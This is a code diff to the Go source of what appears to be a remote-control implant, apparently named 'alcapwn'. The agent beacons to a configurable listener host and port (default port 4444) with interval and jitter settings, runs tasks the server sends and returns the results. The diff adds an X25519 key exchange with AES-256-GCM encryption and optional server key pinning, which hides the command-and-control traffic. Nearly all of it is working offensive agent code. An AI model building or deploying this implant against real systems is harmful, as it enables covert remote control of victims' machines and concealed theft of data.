@@ -33,12 +33,19 @@ import (
 	"alcapwn/proto"
 )
 
-// Build-time variables.  Overridden with -ldflags "-X main.lhost=... -X main.lport=...".
+// Build-time variables.  Overridden with -ldflags at generate time.
+//
+//	-X main.lhost=10.0.0.1
+//	-X main.lport=4444
+//	-X main.interval=60
+//	-X main.jitter=20
+//	-X main.serverFingerprint=<sha256-hex-of-server-pubkey>
 var (
-	lhost    = "127.0.0.1"
-	lport    = "4444"
-	interval = "60"
-	jitter   = "20"
+	lhost             = "127.0.0.1"
+	lport             = "4444"
+	interval          = "60"
+	jitter            = "20"
+	serverFingerprint = "" // leave empty to skip pinning (insecure; dev only)
 )
 
 const agentVersion = "v3"
@@ -76,8 +83,8 @@ func buildHello() proto.Hello {
 	}
 }
 
-// runSession dials the server, completes the handshake, and runs the task loop
-// until the connection closes or an error occurs.
+// runSession dials the server, completes the encrypted handshake, and runs
+// the task loop until the connection closes or an error occurs.
 func runSession(hello proto.Hello) error {
 	conn, err := net.DialTimeout("tcp", net.JoinHostPort(lhost, lport), 10*time.Second)
 	if err != nil {
@@ -85,11 +92,24 @@ func runSession(hello proto.Hello) error {
 	}
 	defer conn.Close()
 
-	if err := proto.WriteMsg(conn, proto.MsgHello, hello); err != nil {
+	// Write the 4-byte ALCA routing tag so the server's acceptLoop identifies
+	// this as an agent connection before performing the key exchange.
+	if _, err := conn.Write(proto.Magic[:]); err != nil {
+		return fmt.Errorf("routing tag: %w", err)
+	}
+
+	// X25519 handshake → AES-256-GCM session.
+	// serverFingerprint may be "" in development builds (skips pinning).
+	cs, err := proto.NewClientCryptoSession(conn, serverFingerprint)
+	if err != nil {
+		return fmt.Errorf("crypto handshake: %w", err)
+	}
+
+	if err := proto.WriteMsgEncrypted(conn, cs, proto.MsgHello, hello); err != nil {
 		return fmt.Errorf("hello: %w", err)
 	}
 
-	env, err := proto.ReadMsg(conn)
+	env, err := proto.ReadMsgEncrypted(conn, cs)
 	if err != nil {
 		return fmt.Errorf("welcome: %w", err)
 	}
@@ -101,12 +121,13 @@ func runSession(hello proto.Hello) error {
 		return fmt.Errorf("welcome decode: %w", err)
 	}
 
-	return taskLoop(conn)
+	return taskLoop(conn, cs)
 }
 
 // taskLoop is the main agent event loop.  It reads Tasks from the server and
 // writes Results back.  A Ping is sent every 30 seconds to detect stale connections.
-func taskLoop(conn net.Conn) error {
+// All messages are encrypted via cs.
+func taskLoop(conn net.Conn, cs *proto.CryptoSession) error {
 	pingTick := time.NewTicker(30 * time.Second)
 	defer pingTick.Stop()
 
@@ -114,10 +135,10 @@ func taskLoop(conn net.Conn) error {
 	errCh := make(chan error, 1)
 	var closed atomic.Bool
 
-	// Read goroutine: deserialises incoming frames and forwards them.
+	// Read goroutine: decrypts incoming frames and forwards them.
 	go func() {
 		for {
-			env, err := proto.ReadMsg(conn)
+			env, err := proto.ReadMsgEncrypted(conn, cs)
 			if err != nil {
 				if !closed.Load() {
 					errCh <- err
@@ -134,7 +155,7 @@ func taskLoop(conn net.Conn) error {
 			return err
 
 		case <-pingTick.C:
-			if err := proto.WriteMsg(conn, proto.MsgPing, struct{}{}); err != nil {
+			if err := proto.WriteMsgEncrypted(conn, cs, proto.MsgPing, struct{}{}); err != nil {
 				closed.Store(true)
 				return err
 			}
@@ -150,7 +171,7 @@ func taskLoop(conn net.Conn) error {
 					continue
 				}
 				res := executeTask(task)
-				if err := proto.WriteMsg(conn, proto.MsgResult, res); err != nil {
+				if err := proto.WriteMsgEncrypted(conn, cs, proto.MsgResult, res); err != nil {
 					closed.Store(true)
 					return err
 				}
